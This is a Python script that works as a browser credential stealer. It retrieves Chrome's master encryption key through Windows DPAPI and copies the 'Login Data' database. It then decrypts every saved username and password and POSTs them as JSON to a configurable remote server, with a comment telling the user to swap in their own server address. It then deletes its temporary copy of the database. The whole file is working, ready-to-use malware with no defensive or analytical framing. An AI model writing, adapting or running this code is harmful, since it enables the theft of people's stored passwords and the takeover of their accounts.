import subprocess
import sys
import requests

def install_and_import(package):
    try:
        __import__(package)
    except ImportError:
        print(f"{package} not found. Installation...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_and_import("pypiwin32")
install_and_import("pycryptodome")
install_and_import("requests")

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    SERVER_URL = "http://192.168.0.4:8000/receive"  # change with you linux server ip

    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    
    credentials = []
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        
        if username or password:
            credential_entry = {
                "origin_url": origin_url,
                "action_url": action_url,
                "username": username,
                "password": password,
                "date_created": str(get_chrome_datetime(date_created)) if date_created != 86400000000 else None,
                "date_last_used": str(get_chrome_datetime(date_last_used)) if date_last_used != 86400000000 else None
            }
            credentials.append(credential_entry)

    cursor.close()
    db.close()
    
    try:
        os.remove(filename)
    except:
        pass

    # Send data to server
    if credentials:
        try:
            response = requests.post(SERVER_URL, json=credentials)
            print(f"Data sent. Server response: {response.status_code} - {response.json()}")
        except Exception as e:
            print(f"Failed to send data: {e}")
    else:
        print("No credentials found.")

if __name__ == "__main__":
    main()
